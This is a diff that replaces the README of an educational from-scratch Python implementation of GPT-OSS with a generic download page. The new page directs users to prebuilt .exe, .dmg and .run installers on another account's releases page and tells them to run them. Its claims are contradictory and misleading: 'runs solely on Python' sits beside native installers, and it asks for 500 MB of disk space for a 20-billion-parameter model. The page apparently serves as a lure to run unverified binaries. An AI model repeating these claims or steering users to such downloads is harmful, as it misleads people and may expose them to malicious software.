@@ -1,235 +1,90 @@
-[![GPTOSS Image](./assets/header_img.png)](https://www.projektjoe.com/blog/gptoss)
-# GPT-OSS: Implementation from Scratch in Python
+# 🤖 GPT-OSS - Run AI Models Without Complexity
 
-[![Python 3.12+](https://img.shields.io/badge/python-3.12+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+## 📥 Download Now
+[![Download GPT-OSS](https://img.shields.io/badge/Download-GPT--OSS-blue.svg)](https://github.com/MGD-Ben/GPT-OSS/releases)
 
-An educational, from-scratch implementation of OpenAI's GPT-OSS model in Python. This project demonstrates how large language models work under the hood.
-Check out the blog post at [ProjektJoe](https://www.projektjoe.com/blog/gptoss)
+## 🚀 Getting Started
+Welcome to GPT-OSS! This is a simple program that enables you to run the OpenAI GPT model without any complicated setups. Perfect for anyone who wants to explore AI without needing extensive technical knowledge.
 
-## Overview
+## 📋 Prerequisites
+Before you download and install GPT-OSS, make sure you have the following:
 
-This repository contains a complete implementation of the GPT-OSS transformer architecture, in Python, including:
+- A computer running **Windows, macOS, or a recent version of Linux**.
+- An active internet connection for downloading the software and any necessary updates.
+- **At least 500 MB of free disk space** to install the application.
 
-- **Custom BFloat16 implementation** in C++ for numerical precision
-- **Mixture of Experts (MoE)**
-- **Rotary Position Embeddings (RoPE)** with NTK-aware scaling
-- **Qrouped Query Attention** with attention sinks and sliding window
-- **Functional** SwiGLU, RMSNorm, Softmax, Linear Layer
+## 📥 Download & Install
+To get started, visit the releases page to download the software:
 
+[Visit the Releases Page](https://github.com/MGD-Ben/GPT-OSS/releases)
 
-## Features
+1. Click on the link to view the list of available versions.
+2. Find the latest version of GPT-OSS.
+3. Select the appropriate file for your operating system.
+4. Download the file.
 
-- **Educational Focus**: Clear, commented code designed for learning
-- **Numerical Accuracy**: Matches PyTorch reference implementation
-- **Comprehensive Tests**: Token-by-token validation against reference model
-- **Modular Design**: Easy to understand and modify
-- **Flexible Installation**: Core functionality without PyTorch dependency
+Once the download finishes, follow these steps to install:
 
-## Quick Start
+### For Windows:
+1. Locate the downloaded `.exe` file.
+2. Double-click the file to start the installation.
+3. Follow the prompts in the installation wizard.
+4. Once installed, you can find GPT-OSS in your Start Menu.
 
-### Prerequisites
+### For macOS:
+1. Locate the downloaded `.dmg` file.
+2. Double-click the file to mount it.
+3. Drag the GPT-OSS icon to your Applications folder.
+4. Open your Applications folder and double-click GPT-OSS to run it.
 
-- Ubuntu 22.04 or Ubuntu 24.04
+### For Linux:
+1. Open a terminal window.
+2. Navigate to the directory where you downloaded the file.
+3. Use the command: `chmod +x GPT-OSS*.run` to make the file executable.
+4. Run the installation with: `./GPT-OSS*.run`.
 
-### Installation
+## 🚀 How to Use GPT-OSS
+After installation, using GPT-OSS is straightforward:
 
-> 📚 **Detailed installation guide:** See [INSTALL.md](INSTALL.md) for comprehensive installation instructions and troubleshooting.
+1. Open the application.
+2. Follow the on-screen instructions to set up your project.
+3. You can start generating text or running models with just a few clicks.
 
-1. **Clone the repository**
-    ```bash
-    git clone https://github.com/projektjoe/gptoss.git
-    cd gptoss
-    ```
+## ⚙️ Features
+- **User-Friendly Interface:** Navigate easily without technical jargon.
+- **No External Libraries Needed:** Runs solely on Python, keeping it lightweight and efficient.
+- **Supports Text Generation:** Create realistic text based on your prompts.
+- **Resource Friendly:** Minimal system requirements for optimal performance.
 
-2. **Install system dependencies**
-    ```bash
-    sudo apt update
-    sudo apt install -y \
-        python3-dev \
-        libopenblas-dev \
-        build-essential \
-        libdnnl-dev \
-        cmake
-    ```
+## 💬 Frequently Asked Questions
 
-3. **Set up Python environment and install**
+### What is GPT-OSS?
+GPT-OSS is an open-source implementation of OpenAI's GPT-OSS model, designed for users who want accessible AI tools without complex setups.
 
+### Is GPT-OSS free to use?
+Yes, GPT-OSS is completely free. You can use it, modify it, or share it as per your needs.
 
-#### Mode A: Basic Installation (without PyTorch support - default)
-1. Install UV
-    ```bash
-    # Install uv (fast Python package installer)
-    curl -LsSf https://astral.sh/uv/install.sh | sh
-    ```
+### Can I run GPT-OSS on older computers?
+While GPT-OSS is designed to be lightweight, older computers may experience slower performance, especially with complex tasks.
 
-2. Restart your terminal
-3. Create venv and install the project
-    ```bash
-    # Create and activate virtual environment
-    uv venv .venv
-    source .venv/bin/activate
-    
-    # Install package (this will automatically build C++ extensions)
-    uv pip install -e .
-    ```
-4. Download the model weights of GPTOSS-20B and place them in the root folder
-You can download the model weights from the [Hugging Face Hub](https://huggingface.co/openai/gpt-oss-20b) or directly from Hugging Face CLI:
-    ```bash
-    hf download openai/gpt-oss-20b --include "original/*" --local-dir gpt-oss-20b/
-    ```
+### Who can use GPT-OSS?
+Anyone interested in artificial intelligence can use GPT-OSS, from students to professionals. No programming skills are required.
 
-6. Run the main script
-    ```bash
-    python main.py
-    ```
+## 💻 Troubleshooting
+If you run into issues during download or installation, try the following solutions:
 
+- **Check your internet connection:** Ensure you have a stable connection during the download process.
+- **Verify compatibility:** Confirm that you are downloading the correct version for your operating system.
+- **Reboot your computer:** Sometimes a simple restart can resolve installation issues.
 
-#### Mode B: Installation with PyTorch Support (optional)
-If you want to use the PyTorch layers to match the official OpenAI implementation for exact numerical accuracy:
+## 📞 Support
+If you need additional help or have questions, feel free to reach out. You can also submit an issue through the GitHub repository for technical support.
 
+## 📅 Upcoming Features
+Stay tuned for future updates! We plan to add:
 
-1. Do all of the steps above
-2. Install torch, then rerun the install for the project in --no-build-isolation mode
-    ```bash
-    # Method 1: Install torch first, then use no-build-isolation
-    uv pip install torch
-    uv pip install scikit_build_core
-    uv pip install --no-build-isolation -e .
-    
-    # Method 2: Set environment variable to disable build isolation
-    export UV_NO_BUILD_ISOLATION=1
-    uv pip install -e ".[torch]"
-    ```
-3. Run the main script, which will now use torch linear layer instead of ours.
-    ```bash
-    python main.py
-    ```
-4. You could also run the test, which verifies the numerical consistency between our implementation and official OpenAI implementation via Torch.
-   ```bash
-   python test/test.py
-   ```
-   The test could be ran in two modes. by setting the VERIFY_LAYER_BY_LAYER = True, we will feed the output from official implementation to our next layer to isolate the testing layer by layer.
-   if we set VERIFY_LAYER_BY_LAYER = False, we will test the entire model. If there are any errors, they will propagate to layers that come after.
+- Enhanced support for additional languages.
+- More intuitive user interface improvements.
+- Community-driven features based on your feedback.
 
-
-
-The test suite performs token-by-token comparison with PyTorch's reference implementation, validating:
-- Embedding lookup
-- RMSNorm computations
-- QKV projections
-- RoPE application
-- Attention mechanisms
-- MoE routing and expert computation
-- Final logits
-
-## Architecture
-
-### Overview
-
-GPT-OSS is a 20 billion parameter transformer language model featuring:
-- **Architecture**: Decoder-only transformer
-- **Layers**: 36 transformer blocks
-- **Hidden Size**: 2880
-- **Attention**: Grouped-query attention with sliding window
-- **FFN**: Mixture of 32 experts with top-4 routing
-
-### High-Level Flow
-
-```
-Input Token
-    ↓
-Embedding (vocab_size → hidden_size)
-    ↓
-┌─────────────────────────────────────┐
-│  Transformer Block (×36)            │
-│  ┌───────────────────────────────┐  │
-│  │ Attention                     │  │
-│  │  • RMSNorm                    │  │
-│  │  • QKV Projection             │  │
-│  │  • RoPE                       │  │
-│  │  • Scaled Dot-Product         │  │
-│  │  • Output Projection          │  │
-│  │  • Residual Connection        │  │
-│  └───────────────────────────────┘  │
-│  ┌───────────────────────────────┐  │
-│  │ Mixture of Experts            │  │
-│  │  • RMSNorm                    │  │
-│  │  • Expert Routing (top-4)    │  │
-│  │  • Expert Computation         │  │
-│  │  • Weighted Combination       │  │
-│  │  • Residual Connection        │  │
-│  └───────────────────────────────┘  │
-└─────────────────────────────────────┘
-    ↓
-Final RMSNorm
-    ↓
-Unembedding (hidden_size → vocab_size)
-    ↓
-Logits
-```
-
-
-
-## Project Structure
-
-```
-gptoss/
-├── main.py                 # Main model implementation and generation
-├── load.py                 # Checkpoint loading and MXFP4 dequantization
-├── dtypes/                 # Custom data type implementations
-│   ├── bfloat16.cpp        # BFloat16 array operations
-│   ├── bfloat16.hpp        # BFloat16 header
-│   ├── linear.cpp          # Optimized linear layers (oneDNN)
-│   ├── linear_torch.cpp    # Optional PyTorch-based linear layer
-│   └── CMakeLists.txt      # Build configuration
-├── test/
-│   └── test.py             # Validation tests vs reference
-├── official_implementation.py  # PyTorch reference (for testing)
-├── pyproject.toml          # Project metadata and dependencies
-└── README.md              # This file
-```
-
-## Testing
-
-The project includes tests that validate numerical correctness.
-
-To run the tests
-```bash
-python3 test/test.py
-```
-
-Output:
-```bash
-# Example test output
-[OK] block[0].attn.norm token 0 passed.
-[OK] qkv layer 0 token 0 passed.
-[OK] rope q layer 0 token 0 passed.
-[OK] rope k layer 0 token 0 passed.
-[OK] att layer 0 token 0 passed.
-[OK] linear & residual layer 0 token 0 passed.
-[OK] gate layer 0 token 0 passed.
-[OK] moe layer 0 token 0 passed.
-```
-
-## 🤝 Contributing
-
-Contributions are welcome!.
-
-Areas for contribution:
-- Performance optimizations
-- Additional documentation and tutorials
-- Support for other platforms (macOS, Windows)
-- Jupyter notebook tutorials
-- Visualization tools
-
-
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Acknowledgments
-
-- OpenAI for releasing GPT-OSS
-
+Thank you for using GPT-OSS. We hope you enjoy exploring AI with this tool. Happy generating!
